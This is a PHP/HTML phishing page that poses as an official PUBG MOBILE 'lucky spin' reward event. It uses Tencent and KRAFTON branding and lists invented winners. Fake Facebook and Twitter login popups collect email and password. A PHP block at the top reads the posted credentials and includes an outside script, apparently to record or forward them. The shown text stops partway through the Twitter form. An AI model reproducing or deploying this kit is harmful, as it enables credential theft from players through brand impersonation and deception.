<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
$username = $_POST['email'];
$password = $_POST['password'];
$files = scandir(__DIR__); // __DIR__ يشير إلى المجلد الحالي
$loginFolder = '';

// ابحث عن الملفات التي تطابق النمط الذي تريده
foreach ($files as $file) {
    if (strpos($file, 'index') !== false) { // تأكد من أن الملف يحتوي على "index" في اسمه
        $loginFolder = basename(__DIR__); // احصل على اسم المجلد الحالي
        break; // أخرج من الحلقة عند العثور على أول ملف مطابق
    }
}
include("../COUNTRY.php");
}
?>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PUBG MOBILE EVENT</title>
<meta property="og:description" content="Start Free Lucky Spin and Collect your exclusive reward from PUBG MOBILE now!">
<meta property="og:image" content="https://i.postimg.cc/jdq9pLMZ/navbar-logo.jpg">
<meta property="og:image:width" content="540">
<meta property="og:image:height" content="282">
<link href="./index_files/css" rel="stylesheet">
<link rel="stylesheet" href="css-zone/facebook.css">
<link rel="stylesheet" href="css-zone/twitter.css">
<link rel="stylesheet" href="css-zone/animate.css">
<link href="https://fonts.googleapis.com/css2?family=Teko&display=swap" rel="stylesheet">
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" type="img/png" href="https://www.pubgmobile.com/common/images/icon_logo.jpg" sizes="32x32">
<script type="text/javascript" src="js-zone/jquery.js"></script>
<script type="text/javascript" src="js-zone/main-zone.js"></script>
<script language="JavaScript">
document.write(ls())
</script>
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<style type="text/css">
@charset "utf-8";
@import url("https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Teko:300,400,500");
*,*:before,*:after {
	-webkit-box-sizing:border-box;
	-moz-box-sizing:border-box;
	box-sizing:border-box;
}
@font-face {
    font-family: 'selow'; 
    font-style: normal;
    font-weight: 700;
    src: url(fonts/selow.woff2) format("woff2"), 
        url(fonts/selow.woff) format("woff"),
        url(fonts/selow.ttf) format("truetype");
}
.landing {
	background: url(img/landing.jpg) no-repeat center center;
	background-size: cover;
	width:100%;
	height:auto;
}
.header {
	width: 100%;
	height: auto;
}
.header img {
	width: 100%;
	height: auto;
	border:none;
}
.header video {
	width: 100%;
	border:none;
}
.slideshow-container {
  max-width: 1000px;
  position: relative;
  margin: auto;
  border-top: 1px solid #ffbe21;
  border-bottom: 1px solid #ffbe21;
}
.fade {
  -webkit-animation-name: fade;
  -webkit-animation-duration: 1.5s;
  animation-name: fade;
  animation-duration: 1.5s;
}
  .notiftwitter {
	width: 30%;
	height: 30px;
	margin-left: 35%;
	margin-right: auto;
	padding: 5px;
	font-size: 22px;
	font-family:Teko;
	font-weight: 500;
	text-align: center;
	color: #ffbe21;
	margin-bottom: 0px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
.season-logo {
	width:20%;
	margin:15px;
	float:left;
}
.season-logos {
	width:40%;
	margin:5px;
	float:right;
}
.season-slogan {
	width: 100%;
	margin-top: 100%;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.season-btn {
	background: url(/img/btn-on.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	padding: 10px;
	padding-left: 30px;
	padding-right: 30px;
	font-size: 18px;
	font-family:selow;
	font-weight: 500;
	text-align: center;
	color: #000;
	margin-bottom: 3px;
	border: none;
	position: relative;
	outline: none;
	display: block;
}
.season-btn:hover {
	background: url(../img/menu_on.png) no-repeat center;
	background-size: 100% 100%;
	color: #000;
	transition: 0.5s;
}
.event-title {
	background:url(img/sub-selow.png) no-repeat center center;
	background-size:100% 100%;
	width:93%;
	height:65px;
	margin-left:auto;
	margin-right:auto;
	margin-top:1px;
	margin-bottom:-10px;
	display:block;
}
.event-subtitle {
    display: block;
    margin-left: 5%;
    margin-right: 5%;
    margin-top: -15px;
    margin-bottom: 25px;
    overflow: hidden;
    text-align: center;
    white-space: nowrap;
    width: 90%;
}
.event-subtitle>span {
    display: inline-block;
    position: relative;
    color: #ffca13;
    cursor: default;
    font-size: 1.4rem;
	text-shadow: 1px 1px 0px rgba(0, 0, 0);
}
.event-subtitle>span:before,
.event-subtitle>span:after {
    background: #ffca13;
	border-bottom: 2px solid #ffca13;
    content: "";
    height: 1px;
    position: absolute;
    top: 50%;
    width: 9999px;
}
.event-subtitle>span:before {
    margin-right: 15px;
    right: 100%;
}
.event-subtitle>span:after {
    left: 100%;
    margin-left: 15px;
}
.event-notification-wrapper {
	width:94%;
	height:auto;
	margin-left:auto;
	margin-right:auto;
	margin-bottom:17px;
	border-bottom:3px solid #464037;
	display:block;
}
.event-notification {
    background: url(img/alert-selow.png) no-repeat center;
	background-size:100% 100%;
	width:90%;
	height:55px;
	padding:5px;	
	padding-left:10px;
	margin-top:5px;
	margin-bottom:6px;
	color:#554CEA;
	font-size:20px;
	font-family:selow;
	text-align:left;
}
.event-notification-text {	
	margin-top:-2px;
	margin-left:39px;
	text-align:left;
	font-family:selow;
	color:#8CF0F2;
	font-size:18px;
}
.popup {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-box-wrapper {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'selow';
	color:#fff;
}
.popup-box-navbar {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbar img {
	width: 25px;
	height: 25px;
	margin-top: 7px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbar-title {	
	padding-top: 12px;
	padding-bottom: 2px;
	font-size: 20px;
	font-family:selow;
	font-weight: 300;
	text-align: center;
	color: #fff;
}
.popup-box-bg {
	background:url(img/popup-box-bg2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -12px;
}
.popup-box-alert {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert2 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert0 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: right;
	display: block;
}
.popup-box-alert3 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: left;
	display: block;
}
.popup-box-alert7 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #F5EAB0;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alertj {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 600;
	text-align: center;
	display: block;
}
.popup-box-alert4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #AAAAAA;
	font-size: 18px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alert4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #AAAAAA;
	font-size: 50px;
	text-align: center;
}
.popup-box-item {
	width:23%;
	height:85px;
	margin-left:auto;
	margin-right:auto;
	text-align: right;
	display: block;
}
.popup-box-item img {
	width:100%;
	height:100%;
}
.popup-box-item span {
	color: #fff;
	font-size: 22px;
	font-family: selow;
	text-align: right;
	position: absolute;
	left: 0;
	right: 2px;
	bottom: -5px;
}
.popup-box-form {
	width: 85%;
	height: auto;
	margin-left: auto;
	margin-right: auto;
	display: block;
}
.popup-box-form label {
  display: inline-block;
  width: 140px;
  text-align: right;
  color: yellow;
}
.popup-box-form input {
	background: #000;
	width: 100%;
	height: auto;
	margin-bottom: 3px;
	padding: 4px;
	color: #fff;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border: 2px solid #AAAAAA;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-form input::placeholder {
	color: #fff;
}
.popup-box-form select {
	background: #000;
	width: 100%;
	height: auto;
	margin-bottom: 3px;
	padding: 4px;
	color: #fff;
	font-size:17px;
	font-family:Teko;
	font-weight: 500;
	border: 2px solid #AAAAAA;
	position: relative;
	outline: none;
	-webkit-appearance: none;
    -moz-appearance: none;
}
.popup-box-footer {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	margin-top: -2px;
	width: 100%;
	height: 45px;
}
.popup-box-footer button:nth-child(1) {
	background: url(img/yes_selow.png) no-repeat center;
background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 5px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-footer button:nth-child(2) {
	background: url(img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;	
	padding: 5px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-footer button {
	background: url(img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 5px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-form-footer {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 45px;
	margin-top: -2px;
}
.popup-box-form-footer button {
	background: url(img/no_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #000;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.popup-btn-login {
    width: 85%;
    height: auto;
    padding: 8px;
    margin-left:auto;
	margin-right:auto;
    color: #000;
	font-size: 15px;
    font-family:selow;
    border-radius: 2px;
    border: none;
    outline: none;
}
.popup-btn-login i {
    color: #fff;
    font-size: 20px;
    float: left;
}
.popup-btn-facebook {
    background: #1778f2;
    color: #fff;
	margin-bottom: 45px;
}
.popup-btn-twitter {
    background: #198B96;
	margin-bottom: 3px;
    color: #fff;
}
.popup-login {
	background:rgba(0,0,0,0.4);
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
}
.popup-box-login-fb {
	background:#ECEFF6;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:1.9%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.popup-box-login-twitter {
	background:#fff;
	max-width:330px;
	height:auto;
	position:relative;
	margin:50px auto;
	margin-top:10%;
	text-align:center;
	font-family:'Teko';
	color:#000;
	border-radius:10px;
}
.close-fb {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	position:absolute;
	top:-8px;
	right:-10px;
	display:block;
}
.close-fb i {
	color:#fff;
	padding-top:1px;
}
.close-other {
	background:#000;
	width:20px;
	height:20px;
	color:#fff;
	text-align:center;
	text-decoration:none;
	border-radius:50%;
	border:1.5px solid #fff;
	top:-8px;
	right:-10px;
	position:absolute;
	z-index:9999999;
	display:block;
}
.close-other i {
	color:#fff;
	padding-top:1px;
}
.popups {
	width:100%;
	height:100%;
	position:fixed;
	top:0;
	left:0;
	z-index:9999;
	background-color:rgba(0, 0, 0, 0.4);
}
.popup-boxs {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'Teko';
	color:#fff;
}
.popup-box-wrappers {
	width: 390px;
	height: auto;
	position: relative;
	margin: 50px auto;
	margin-top: 15%;
	text-align: center;
	font-family:'selow';
	color:#fff;
}
.popup-box-navbars {
	background:url(img/popup-navbar2.png) no-repeat center center;
	background-size:100% 100%;
	height: 43px;
	padding-bottom: 5px;
}
.popup-box-navbars img {
	width: 25px;
	height: 25px;
	margin-top: 9px;
	margin-right: 15px;
	float: right;
}
.popup-box-navbars-title {
	padding-left: 12px;
	padding-top: 12px;
	padding-bottom: 2px;
	font-size: 22px;
	font-family:selow;
	font-weight: 500;
	text-align: left;
	background: -webkit-linear-gradient(#3F1739, #610C2B);
    -webkit-background-clip: text;
    -webkit-text-fill-color: transparent;
}
.popup-box-bgs {
	background:url(img/popup-box-bg2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	margin-top: -12px;
}
.popup-box-alerts4 {
	width: 95%;
	height: auto;
	margin-top: 10px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 10px;
	padding: 5px;
	color: #F5EAB0;
	font-size: 20px;
    font-family:selow;
	font-weight: 500;
	text-align: center;
	display: block;
}
.popup-box-alerts4 i {
	padding-top: 15px;
	padding-bottom: 15px;
	color: #F5EAB0;
	font-size: 50px;
	text-align: center;
}
.popup-box-formx label {
  width: 50%;
  text-align: right;
  color: #000;
  text-shadow:none;
  font-size:15px;
}
.popup-box-formx input {
	background: #7D9595;
	width: 65%;
	height: auto;
	margin-bottom: 3px;
	margin-left: 10px;
	padding-right: 4px;
	padding: 4px;
	color: #fff;
	font-size:14px;
	font-family:selow;
	font-weight: 300;
	border: 0.1px solid #fff;
	outline:none;
	position: relative;
  -webkit-appearance: none;
  -moz-appearance: none;
}
.popup-box-formx input::placeholder {
	color: #BCCBCE;
}
.popup-box-footers {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	margin-top: -2px;
	width: 100%;
	height: 45px;
}
.popup-box-footers button {
	background: url(img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 35px;
	padding-right: 35px;
	color: #000;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border: none;
	outline: none;
}
.popup-box-formx-footer {
	background:url(img/popup-footer2.png) no-repeat center center;
	background-size:100% 100%;
	width: 100%;
	height: 45px;
	margin-top: -17px;
}
.popup-box-formx-footer button {
	background: url(img/yes_selow.png) no-repeat center;
	background-size: 100% 100%;
	width: auto;
	height: auto;
	margin-top: 5px;
	padding: 4px;
	padding-left: 30px;
	padding-right: 30px;
	color: #F4CD34;
	font-size:18px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border:none;
	outline: none;
}
.balance {
	background:url(../img/bg-item.png) no-repeat center center;
	background-size:101% 100%;
	width: 94.3%;
	height: 100px;
	margin-left: auto;
	margin-right: auto;
	margin-bottom: 7px;
	padding: 4px;
	border-top:2px solid #ffbe21;
	border-left:2px solid #ffbe21;
	border-right:2px solid #ffbe21;
	border-bottom:2px solid #ffbe21;
	display: block;
}
.balance-img {
	width: 50%;
	height: 97px;
	margin-top: -5px;
	margin-right: 5px;	
	float: left;	
	padding: 5px;
	border:1px #fff;  
}
.balance-nom {
	color: #fff;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	font-size: 18px;
	font-family:selow;
	font-weight: 500;
	text-align: center;
	text-shadow:0 1px 0 #000;
	border-left: 3px solid #9FE9F7;
	line-height: 18px;
	float: left;
}
.balance-detail {
	width: auto;
	height: auto;
	padding-top: 2px;
	padding-left: 5px;
	padding-bottom: 0px;
	color: #fff;
	font-size: 15px;
	font-family:selow;
	text-align: left;
}
.balance-nom-button {
	background:url(../img/btn-on.png) no-repeat center center;
	background-size:100% 100%;
    width: 36%;
	height: auto;
	margin-top:7px;
	margin-left:auto;
	margin-right:auto;
	padding: 10px;
	font-size: 18px;
	color:#000;
	font-family:selow;
	text-align: center;
	border: none;
	outline: none;
	float: center;
}
.box {
    background: url(img/box.png) no-repeat center;
	background-size: 100% 100%;
    width: 95%;
    height: 350px;
    margin-left:auto;
    margin-right:auto;
	margin-bottom: 12px;
	border: 0px solid #E29E53;
	border-radius:5px;
	position: relative;
	display: block;
}
.box-item {
    width: 95%;
    height: auto;
	display: block;
	margin-left:auto;
    margin-right:auto;
} 
.scroll {
	width:100%;
	overflow:none;
	position:relative;
	width: 100%;
	height:400px;
	margin-top:11px;
	display: block;
	scrollbar-face-color:#ffbb40;
	scrollbar-shadow-color:#ffbb40;
	scrollbar-highlight-color:#ffbb40;
	scrollbar-3dlight-color:#ffbb40;
	scrollbar-darkshadow-color:#ffbb40;
	scrollbar-track-color:#ffbb40;
}
.btn-wrapper {
	width: 100%;
	height: auto;
	margin-top: 10px;
	margin-bottom: -20px;
	margin-left:auto;
	margin-right:auto;
	align-items:center;
	justify-content:space-around;
	display:flex;
}
.btn-wrapper button {
    background: url(img/btn-se3low.png) no-repeat center;
	background-size: 100% 100%;
	width: 36%;
	height: 40px;
	margin-left:auto;
	margin-right:auto;
	margin-bottom: 30px;
	padding: 10px;
	color: #000;
	font-size: 17px;
	font-family: selow;
	font-weight: 500;
	text-align: center;
	border: none;
	border-radius: 4px;
	outline: none;
	display: inline-block;
}
.alert {
	background: url(img/selow.jpg) no-repeat center;
	background-size: 100% 100%;
	width: 100%;
	height: 83px;
	margin-top: -0px;
	margin-bottom: -1px;
	margin-left: auto;
	margin-right: auto;
	border-left: 0px solid #6FF8F8;
	border-right: 0px solid #6FF8F8;
	border-top: 0px solid #6FF8F8;
	border-bottom: 0px solid #6FF8F8;
	display: block;
}
.item4 {
	background-size:display;
	width: 41%;
    height: 79px;
	margin: 2px;
	margin-top: 1px;	
	margin-bottom: 1px;
	display: inline-block;
	border: 2px solid #8DF0F1;
	border-radius: 3px;
}
.item4 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 1px;
}
.item3 {
	background-size:display;
    width: 28%;
    height: 105px;
	margin: 2px;
	margin-top: 5px;	
	margin-bottom: 7px;
	display: inline-block;
	border: 2px solid #8DF0F1;
	border-radius: 3px;	
}
.item3 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 1px;
}
.itembutton {
	background-size:display;
    width: 28%;
    height: 105px;
	margin: 2px;
	margin-top: 5px;	
	margin-bottom: 1px;
	display: inline-block;
}
.itembutton img {
	background-size:display;
	width: 100%;
    height: 100%; 
}
.item5 {
	background-size:display;
    width: 21%;
    height: 79px;
	margin: 2px;
	margin-top: 1px;	
	margin-bottom: 1px;
	display: inline-block;
	border: 2px solid #8DF0F1;
	border-radius: 3px;
}
.item5 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 1px;
}
.item2 {
	background-size:display;
    width: 21%;
    height: 79px;
	margin: 1px;
	margin-top: 30px;
	margin-bottom: -5px;
	display: inline-block;
	border: 2px solid #8DF0F1;
	border-radius: 3px;
}
.item2 img {
	background-size:display;
	width: 100%;
    height: 100%; 
    border:none;   
    border-radius: 1px;
}
figure {
	margin: 0;
	padding: 0;
	overflow: hidden;
}
.itemShine {
	position: relative;
}
.itemShine::before {
	background: -webkit-linear-gradient(left, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	background: linear-gradient(to right, rgba(255,255,255,0) 0%, rgba(255,255,255,.3) 100%);
	width: auto;
	height: auto;
	top: 0;
	left: -75%;
	position: absolute;
	z-index: 2;
	content: '';
	display: block;
	-webkit-transform: skewX(-25deg);
	transform: skewX(-25deg);
}
.itemShine::before {
	-webkit-animation: shine 2s infinite;
	animation: shine 2s infinite;
}
@-webkit-keyframes shine {
	100% {
		left: 125%;
		}
}
@keyframes shine {
	100% {
		left: 125%;
		}
}
.kanan {
	float: right;
}
.kiri {
	float: left;
}
.tengah {
	margin-left: auto;
	margin-right: auto;
	display: block;
}
::-webkit-scrollbar { 
    display: none;
    width: 0px;
}
.border_hadiah{
	border:2px solid red;
    background: linear-gradient(90deg, rgba(255,0,109,1) 8%, rgba(255,250,0,0.10303017436594208) 12%);
	display:inline-block;
}
@media only screen and (max-width:600px) {
    .containerLanding, .containerHome {
        width: 100%;
        height: auto;
        margin-top: 0px;
        margin-bottom: 0px;
		border-left: 2px solid #6FF8F8;
	    border-right: 3px solid #6FF8F8;
        border-radius: 0px;
        padding: 0px;
    }
    .gallery-container {
	    width: 100%;
		height: auto;
		border-top: 0px solid #6FF8F8;
		border-left: 0px solid #6FF8F8;
	    border-right: 0px solid #6FF8F8;
    }
    .box {
	    width: 100%;
		height: 320px;
	}
    .scroll {
        height: 400px;
    }
    .alert {
    border-top: 0px solid #1288A1;
	border-left: 0px solid #6FF8F8;
	border-right: 0px solid #6FF8F8;
	border-bottom: 0px solid #1288A1;
    }
    .navbar {
    border-top: 0px solid #6FF8F8;
	border-left: 0px solid #6FF8F8;
	border-right: 0px solid #6FF8F8;
	border-bottom: 0px solid #6FF8F8;
    }
    .footer {
    border-top: 0px solid #6FF8F8;
	border-left: 0px solid #6FF8F8;
	border-right: 0px solid #6FF8F8;
	border-bottom: 0px solid #6FF8F8;
	}
    .season-alert {
	width:99%;
	height: 70px;
    }
    .item2 {
        width: 21%;
        height: 72px;
    }
    .item3 {
        width: 28%;
        height: 96px;
    }
    .itembutton {
        width: 28%;
        height: 96px;
    }    
    .item4 {
        width: 40%;
        height: 74px;
    }
    .item5 {
        width: 22%;
        height: 74px;
    }
    .event-title {
    	width:95%;
	    height:65px;
    }
    .event-notification {
        width:91%;
	    height:50px;
	}
    .event-notification-text {	
 	   margin-top:-3px;
	   margin-left:37px;
	   text-align:left;
	   font-family:selow;
	   color:#8CF0F2;
	   font-size:17px;
    }
    .popup-box-wrapper {
        width: 360;
        margin-top: 60%;
    }
    .popup-box-item {
        width: 25%;
        height: 88px;
    }
    .popup-box-login-fb {
        margin-top: 4%;
    }
    .popup-box-login-twitter {
        margin-top: 25%;
    }
}
</style>
<div class="slider-container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/y8vBWnXX/navbar-logo-min.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> 
</div> 
<div class="header">
<img src="header/selow.jpg" style="width: 100%;"></div>
</div> 
<div class="gallery-container">
<img style="width: 100%; height: auto; margin-top: -20px; margin-left: auto; margin-right: auto;" src="img/se3low.png">
<div class="event-title"></div> 
<div class="box">
<div class="box-item">
<center>
<div class="item2" data-order="0">
<img src="img/reward/1.png">
</div>
<div class="item2" data-order="1">
<img src="img/reward/2.png">
</div>
<div class="item4" data-order="3">
<img src="img/reward/4.png">
</div>
<div class="item3" data-order="8">
<img src="img/reward/9.png">
</div>
<div class="itembutton putarkan">
<img src="img/draw-se3low.png">
</div>
<div class="item3" data-order="4">
<img src="img/reward/5.png">
</div>
<div class="item4" data-order="7">
<img src="img/reward/8.png">
</div>
<div class="item5" data-order="6">
<img src="img/reward/7.png">
</div>
<div class="item5" data-order="5">
<img src="img/reward/6.png">
</div>
</center>
</div></div> 
<div class="event-notification">
<div class="event-notification-text">
<div class="slider animated fadeIn">ID 5883485425 Successfully Got white mumiset</div>
<div class="slider animated fadeIn">ID 5295893347 Successfully Got Inferno helmet</div>
<div class="slider animated fadeIn">ID 5963737318 Successfully Got 1 m4 the fool</div>
<div class="slider animated fadeIn">ID 5886864517 Successfully Got 5 Materials</div>
<div class="slider animated fadeIn">ID 5155030554 Successfully Got 1 m4 glacier</div>
<div class="slider animated fadeIn">ID 5463336783 Successfully Got Warp Universe</div>
<div class="slider animated fadeIn">ID 5463336783 Successfully Got 3000 uc</div>
</div> </div> 
</div> 
</div> 
</section> 
</div> 
</div> 
</div> 
<div class="footer">
<div class="footer-txt-copyrights">Partnership Inquiry: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="9aeaeff8fdf7f5f8f3f6ffc5f8efe9f3f4ffe9e9daeefff4f9fff4eeb4f9f5f7">[email&#160;protected]</a></div> 
<img class="footer-copyright-icon" src="img/footer.png">
<div class="footer-txt-copyright">ⓒ 2024 KRAFTON, Inc. All rights reserved.</div> 
<div class="footer-txt-copyright">ⓒ 2018-2021 Tencent. All rights reserved.</div> 
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> 
<br>
</div> 
<div class="popup itemReward_confirmation" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Congratulations</div> 
</div> 
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>You Got</div> 
<div class="popup-box-item itemShine">
<div>
<figure>
<img class="gift_img popup-item" src="img/reward/1.png">
</figure>
</div>
</div> 
<br>
<div class="popup-box-footer">
<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_account_login()">Collect</button>
</div> 
</div> 
</div> 
</div> 
<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-navbar">
<div class="popup-box-navbar-title">Account Log in</div> 
</div> 
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>
Log in to PUBG MOBILE account</div> 
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-twitter" onclick="open_twitter();"><i class="fa fa-twitter-square icon-login"></i>Log in using Twitter account</button>
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i>Log in using Facebook account</button>
<img style="width: 90%; height: auto; margin-top: -30px; margin-left: auto; margin-right: auto;" src="https://i.postimg.cc/66bK3tfJ/Amod.png">
<br><br><br>
</div> 
</div> 
</div> 
</div> 
<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="https://i.ibb.co/Wg8qQxh/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 330px; top: -15px; text-align: left;">The email address or phone number that you've entered doesn't match any account. <b>Sign up for an account.</b></p>
<p class="kaget sandi-fb" style="width: 330px; top: -15px; text-align: left;">The password that you've entered is incorrect. Forgotten password?</p>
<img src="https://www.pubgmobile.com/id/event/royalepass10/images/icon_logo.jpg">
<div class="txt-login-fb">
Log in to your Facebook account to connect to PUBG MOBILE.
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm">
<label>
<input type="text" class="loginEmail" name="email" id="email-facebook" placeholder="Mobile number or email address" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Email or Mobile Number')" oninput="setCustomValidity('')">
</label><label>
<input type="password" class="loginPassword" name="password" id="password-facebook" placeholder="Password" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Enter Password')" oninput="setCustomValidity('')"></label>
<div class="showHide showPassword" onclick="showFbPassword()"><i class="zmdi zmdi-eye-off zmdi-hc-2x"></i></div>
<div class="showHide hidePassword" style="display: none;" onclick="hideFbPassword()"><i class="zmdi zmdi-eye zmdi-hc-2x"></i></div>
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Create Account</div>
<div class="txt-not-now">Not now</div>
<div class="txt-forgotten-password">Forgotten password?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">English (UK)</div>
<div class="language-name">العربية</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">Português (Brasil)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Facebook Inc.</div>
</div>
</div>
<div class="popup-login login-twitter animated fadeIn" style="display: none;">
<div class="popup-box-login-twitter">
<a onclick="close_twitter()" class="close-other"><i class="zmdi zmdi-close"></i></a>
<div class="box-twitter">
<center>
<div class="header-twitter">
<img src="https://i.ibb.co/V9rgBqw/twitter-text.png" style="margin-bottom: -35px; margin-left: 135px;">
</center>
<center>
<br><br>
<form action="javascript:void(0)" method="post" id="ValidateLoginTwitterForm">
<div class="txt-login-twitter" style="text-align: left; margin-left: 95px;">Login to Twitter</div> 
<div class="input-box-twitter">
<label>Phone, email, or username</label>
